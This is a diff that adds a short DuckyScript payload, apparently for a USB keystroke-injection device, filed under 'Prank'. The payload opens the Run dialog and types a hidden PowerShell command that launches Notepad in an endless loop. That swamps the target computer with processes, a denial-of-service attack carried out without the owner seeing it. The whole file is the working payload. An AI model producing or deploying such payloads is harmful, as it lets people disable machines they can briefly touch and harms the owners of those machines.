@@ -1,0 +1,7 @@
+REM Category: Prank
+REM ---------------------
+GUI R
+DELAY 200
+REM Opens Notepad repeatedly
+STRING powershell -WindowStyle Hidden -Command "while (1) {Start-Process notepad}"
+ENTER
